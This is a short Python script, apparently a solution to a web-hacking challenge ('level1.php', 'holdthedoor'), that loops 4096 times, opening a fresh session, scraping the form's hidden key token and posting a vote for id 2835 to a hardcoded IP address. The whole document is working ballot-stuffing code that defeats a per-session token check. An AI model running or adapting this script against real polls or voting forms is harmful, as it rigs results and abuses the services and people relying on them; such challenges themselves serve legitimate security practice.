#!/usr/bin/python3
import sys
import requests
from bs4 import BeautifulSoup


url = "http://158.69.76.135/level1.php"
id = 2835
repeat = 4096

for i in range(repeat):
    print("voting time {}".format(i))
    s = requests.session()
    r = s.get(url)
    doc = r.content

    soup = BeautifulSoup(doc, 'html.parser')

    key = soup.find("input", {"name": "key"})
    key_value = key.get("value")

    s.post(url, data={"id": id, "holdthedoor": 1, "key": key_value})
